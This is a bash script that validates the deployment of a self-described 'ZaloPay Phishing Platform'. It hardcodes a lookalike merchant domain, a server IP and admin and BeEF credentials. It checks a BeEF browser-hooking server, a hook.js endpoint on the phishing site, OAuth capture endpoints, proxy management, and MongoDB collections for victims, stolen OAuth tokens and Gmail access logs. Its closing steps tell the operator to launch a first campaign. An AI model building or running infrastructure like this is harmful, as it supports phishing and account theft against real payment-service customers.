#!/bin/bash

# Deployment Validation Script for ZaloPay Phishing Platform
# Comprehensive testing and validation of all services

set -e

# Configuration
DOMAIN="zalopaymerchan.com"
SERVER_IP="221.120.163.129"
ADMIN_USERNAME="admin"
ADMIN_PASSWORD="Admin@ZaloPay2025!"
BEEF_USERNAME="zalopay_admin"
BEEF_PASSWORD="ZalopayBeef2025!SecurePass"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
NC='\033[0m' # No Color

# Logging functions
log() {
    echo -e "${BLUE}[$(date +'%Y-%m-%d %H:%M:%S')]${NC} $1"
}

error() {
    echo -e "${RED}[ERROR]${NC} $1" >&2
}

success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

info() {
    echo -e "${PURPLE}[INFO]${NC} $1"
}

# Test counters
TESTS_PASSED=0
TESTS_FAILED=0
TESTS_TOTAL=0

# Test result tracking
test_result() {
    local test_name="$1"
    local result="$2"
    local message="$3"
    
    TESTS_TOTAL=$((TESTS_TOTAL + 1))
    
    if [ "$result" = "PASS" ]; then
        TESTS_PASSED=$((TESTS_PASSED + 1))
        success "✓ $test_name: $message"
    else
        TESTS_FAILED=$((TESTS_FAILED + 1))
        error "✗ $test_name: $message"
    fi
}

# Check Docker containers
check_containers() {
    log "Checking Docker containers..."
    
    local containers=(
        "nginx-lb"
        "backend-1"
        "backend-2" 
        "backend-3"
        "frontend"
        "mongodb-primary"
        "mongodb-secondary-1"
        "mongodb-secondary-2"
        "redis-master"
        "redis-replica-1"
        "influxdb"
        "beef"
    )
    
    for container in "${containers[@]}"; do
        if docker ps | grep -q "$container"; then
            local status=$(docker ps --format "table {{.Status}}" | grep "$container" | head -1)
            test_result "Container $container" "PASS" "Running - $status"
        else
            test_result "Container $container" "FAIL" "Not running"
        fi
    done
}

# Check service health endpoints
check_health_endpoints() {
    log "Checking service health endpoints..."
    
    # Backend health
    if curl -f -s http://localhost:8000/health > /dev/null 2>&1; then
        test_result "Backend Health" "PASS" "Backend API responding"
    else
        test_result "Backend Health" "FAIL" "Backend API not responding"
    fi
    
    # Frontend health
    if curl -f -s http://localhost:80 > /dev/null 2>&1; then
        test_result "Frontend Health" "PASS" "Frontend responding"
    else
        test_result "Frontend Health" "FAIL" "Frontend not responding"
    fi
    
    # BeEF health
    if curl -f -s http://localhost:3000/api/hooks > /dev/null 2>&1; then
        test_result "BeEF Health" "PASS" "BeEF API responding"
    else
        test_result "BeEF Health" "FAIL" "BeEF API not responding"
    fi
    
    # Load balancer health
    if curl -f -s http://localhost:80/health/lb > /dev/null 2>&1; then
        test_result "Load Balancer Health" "PASS" "Nginx load balancer responding"
    else
        test_result "Load Balancer Health" "FAIL" "Nginx load balancer not responding"
    fi
}

# Check database connectivity
check_databases() {
    log "Checking database connectivity..."
    
    # MongoDB replica set
    if docker exec mongodb-primary mongosh --eval "rs.status().ok" --quiet 2>/dev/null | grep -q "1"; then
        test_result "MongoDB Replica Set" "PASS" "Replica set healthy"
    else
        test_result "MongoDB Replica Set" "FAIL" "Replica set unhealthy"
    fi
    
    # Redis
    if docker exec redis-master redis-cli ping 2>/dev/null | grep -q "PONG"; then
        test_result "Redis Master" "PASS" "Redis responding"
    else
        test_result "Redis Master" "FAIL" "Redis not responding"
    fi
    
    # InfluxDB
    if curl -f -s http://localhost:8086/health > /dev/null 2>&1; then
        test_result "InfluxDB" "PASS" "InfluxDB responding"
    else
        test_result "InfluxDB" "FAIL" "InfluxDB not responding"
    fi
}

# Check SSL certificate
check_ssl_certificate() {
    log "Checking SSL certificate..."
    
    # Check if certificate exists
    if [ -f "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" ]; then
        test_result "SSL Certificate File" "PASS" "Certificate file exists"
        
        # Check certificate validity
        local cert_info=$(openssl s_client -connect $DOMAIN:443 -servername $DOMAIN < /dev/null 2>/dev/null | openssl x509 -noout -dates 2>/dev/null)
        if [ $? -eq 0 ]; then
            test_result "SSL Certificate Validity" "PASS" "Certificate is valid"
        else
            test_result "SSL Certificate Validity" "FAIL" "Certificate validation failed"
        fi
        
        # Check HTTPS accessibility
        if curl -f -s -I https://$DOMAIN > /dev/null 2>&1; then
            test_result "HTTPS Accessibility" "PASS" "HTTPS site accessible"
        else
            test_result "HTTPS Accessibility" "FAIL" "HTTPS site not accessible"
        fi
    else
        test_result "SSL Certificate File" "FAIL" "Certificate file not found"
        test_result "SSL Certificate Validity" "FAIL" "Cannot validate without certificate"
        test_result "HTTPS Accessibility" "FAIL" "Cannot test HTTPS without certificate"
    fi
}

# Check admin dashboard access
check_admin_dashboard() {
    log "Checking admin dashboard access..."
    
    # Check if admin page loads
    if curl -f -s https://$DOMAIN/admin/ > /dev/null 2>&1; then
        test_result "Admin Dashboard Load" "PASS" "Admin page loads"
    else
        test_result "Admin Dashboard Load" "FAIL" "Admin page not accessible"
    fi
    
    # Test admin login (this would require more complex testing in a real scenario)
    # For now, we'll just check if the login endpoint exists
    if curl -f -s https://$DOMAIN/api/auth/login > /dev/null 2>&1; then
        test_result "Admin Login Endpoint" "PASS" "Login endpoint accessible"
    else
        test_result "Admin Login Endpoint" "FAIL" "Login endpoint not accessible"
    fi
}

# Check OAuth configuration
check_oauth_config() {
    log "Checking OAuth configuration..."
    
    # Check OAuth callback endpoint
    if curl -f -s https://$DOMAIN/oauth/callback > /dev/null 2>&1; then
        test_result "OAuth Callback Endpoint" "PASS" "OAuth callback accessible"
    else
        test_result "OAuth Callback Endpoint" "FAIL" "OAuth callback not accessible"
    fi
    
    # Check OAuth login endpoint
    if curl -f -s https://$DOMAIN/oauth/login > /dev/null 2>&1; then
        test_result "OAuth Login Endpoint" "PASS" "OAuth login accessible"
    else
        test_result "OAuth Login Endpoint" "FAIL" "OAuth login not accessible"
    fi
}

# Check BeEF integration
check_beef_integration() {
    log "Checking BeEF integration..."
    
    # Check BeEF hook endpoint
    if curl -f -s https://$DOMAIN/hook.js > /dev/null 2>&1; then
        test_result "BeEF Hook Endpoint" "PASS" "Hook script accessible"
    else
        test_result "BeEF Hook Endpoint" "FAIL" "Hook script not accessible"
    fi
    
    # Check BeEF admin panel
    if curl -f -s http://$SERVER_IP:3000 > /dev/null 2>&1; then
        test_result "BeEF Admin Panel" "PASS" "BeEF admin panel accessible"
    else
        test_result "BeEF Admin Panel" "FAIL" "BeEF admin panel not accessible"
    fi
    
    # Check BeEF API
    if curl -f -s http://$SERVER_IP:3000/api/hooks > /dev/null 2>&1; then
        test_result "BeEF API" "PASS" "BeEF API responding"
    else
        test_result "BeEF API" "FAIL" "BeEF API not responding"
    fi
}

# Check proxy management
check_proxy_management() {
    log "Checking proxy management..."
    
    # Check proxy management endpoint
    if curl -f -s https://$DOMAIN/api/admin/proxies > /dev/null 2>&1; then
        test_result "Proxy Management API" "PASS" "Proxy API accessible"
    else
        test_result "Proxy Management API" "FAIL" "Proxy API not accessible"
    fi
    
    # Check if proxy management page loads
    if curl -f -s https://$DOMAIN/admin/proxy_management.html > /dev/null 2>&1; then
        test_result "Proxy Management UI" "PASS" "Proxy management page loads"
    else
        test_result "Proxy Management UI" "FAIL" "Proxy management page not accessible"
    fi
}

# Check database collections
check_database_collections() {
    log "Checking database collections..."
    
    local collections=(
        "victims"
        "oauth_tokens"
        "admin_users"
        "campaigns"
        "activity_logs"
        "gmail_access_logs"
        "beef_sessions"
        "proxies"
    )
    
    for collection in "${collections[@]}"; do
        local count=$(docker exec mongodb-primary mongosh zalopay_phishing --eval "db.$collection.countDocuments()" --quiet 2>/dev/null | tail -1)
        if [ "$count" -ge 0 ] 2>/dev/null; then
            test_result "Collection $collection" "PASS" "Collection exists with $count documents"
        else
            test_result "Collection $collection" "FAIL" "Collection not accessible"
        fi
    done
}

# Check admin user exists
check_admin_user() {
    log "Checking admin user..."
    
    local admin_exists=$(docker exec mongodb-primary mongosh zalopay_phishing --eval "db.admin_users.findOne({username: 'admin'})" --quiet 2>/dev/null | grep -c "ObjectId" || echo "0")
    
    if [ "$admin_exists" -gt 0 ]; then
        test_result "Admin User" "PASS" "Admin user exists in database"
    else
        test_result "Admin User" "FAIL" "Admin user not found in database"
    fi
}

# Performance tests
check_performance() {
    log "Checking performance metrics..."
    
    # Test response times
    local response_time=$(curl -w "%{time_total}" -s -o /dev/null https://$DOMAIN/)
    local response_time_ms=$(echo "$response_time * 1000" | bc)
    
    if (( $(echo "$response_time_ms < 2000" | bc -l) )); then
        test_result "Response Time" "PASS" "Response time ${response_time_ms}ms (good)"
    elif (( $(echo "$response_time_ms < 5000" | bc -l) )); then
        test_result "Response Time" "PASS" "Response time ${response_time_ms}ms (acceptable)"
    else
        test_result "Response Time" "FAIL" "Response time ${response_time_ms}ms (slow)"
    fi
    
    # Check memory usage
    local memory_usage=$(docker stats --no-stream --format "table {{.MemUsage}}" | grep -v "MEM USAGE" | head -5 | awk '{sum += $1} END {print sum}')
    if [ "$memory_usage" -lt 8000 ]; then
        test_result "Memory Usage" "PASS" "Memory usage ${memory_usage}MB (good)"
    else
        test_result "Memory Usage" "FAIL" "Memory usage ${memory_usage}MB (high)"
    fi
}

# Security checks
check_security() {
    log "Checking security configurations..."
    
    # Check HTTPS redirect
    local http_response=$(curl -I -s http://$DOMAIN/ | head -1)
    if echo "$http_response" | grep -q "301\|302"; then
        test_result "HTTP to HTTPS Redirect" "PASS" "HTTP redirects to HTTPS"
    else
        test_result "HTTP to HTTPS Redirect" "FAIL" "HTTP does not redirect to HTTPS"
    fi
    
    # Check security headers
    local security_headers=$(curl -I -s https://$DOMAIN/ | grep -i "strict-transport-security\|x-frame-options\|x-content-type-options")
    if [ -n "$security_headers" ]; then
        test_result "Security Headers" "PASS" "Security headers present"
    else
        test_result "Security Headers" "FAIL" "Security headers missing"
    fi
    
    # Check for exposed sensitive files
    local sensitive_files=(".env" "config.py" "mongodb-keyfile")
    for file in "${sensitive_files[@]}"; do
        if curl -f -s https://$DOMAIN/$file > /dev/null 2>&1; then
            test_result "Sensitive File $file" "FAIL" "Sensitive file exposed"
        else
            test_result "Sensitive File $file" "PASS" "Sensitive file not exposed"
        fi
    done
}

# Generate validation report
generate_report() {
    log "Generating validation report..."
    
    local success_rate=$((TESTS_PASSED * 100 / TESTS_TOTAL))
    
    echo
    echo "=========================================="
    echo "DEPLOYMENT VALIDATION REPORT"
    echo "=========================================="
    echo
    echo "📊 Test Results:"
    echo "   Total Tests: $TESTS_TOTAL"
    echo "   Passed: $TESTS_PASSED"
    echo "   Failed: $TESTS_FAILED"
    echo "   Success Rate: $success_rate%"
    echo
    echo "🌐 Access Information:"
    echo "   Admin Dashboard: https://$DOMAIN/admin/"
    echo "   Merchant Site: https://$DOMAIN/"
    echo "   BeEF Panel: http://$SERVER_IP:3000"
    echo
    echo "🔐 Default Credentials:"
    echo "   Admin: $ADMIN_USERNAME / $ADMIN_PASSWORD"
    echo "   BeEF: $BEEF_USERNAME / $BEEF_PASSWORD"
    echo
    
    if [ $TESTS_FAILED -eq 0 ]; then
        success "🎉 All tests passed! Deployment is successful!"
        echo
        echo "✅ Next Steps:"
        echo "   1. Login to admin dashboard"
        echo "   2. Change default passwords"
        echo "   3. Add proxy pool"
        echo "   4. Create first campaign"
        echo "   5. Test OAuth flow"
        echo
    else
        warning "⚠️  Some tests failed. Please review the issues above."
        echo
        echo "🔧 Troubleshooting:"
        echo "   1. Check Docker container logs"
        echo "   2. Verify SSL certificate"
        echo "   3. Check database connectivity"
        echo "   4. Review nginx configuration"
        echo
    fi
}

# Main execution
main() {
    log "Starting deployment validation..."
    
    # Check if running as root or with Docker access
    if ! docker ps > /dev/null 2>&1; then
        error "Docker access required. Please run as root or add user to docker group."
        exit 1
    fi
    
    # Run all validation checks
    check_containers
    check_health_endpoints
    check_databases
    check_ssl_certificate
    check_admin_dashboard
    check_oauth_config
    check_beef_integration
    check_proxy_management
    check_database_collections
    check_admin_user
    check_performance
    check_security
    
    # Generate final report
    generate_report
    
    # Exit with appropriate code
    if [ $TESTS_FAILED -eq 0 ]; then
        exit 0
    else
        exit 1
    fi
}

# Run main function
main "$@"
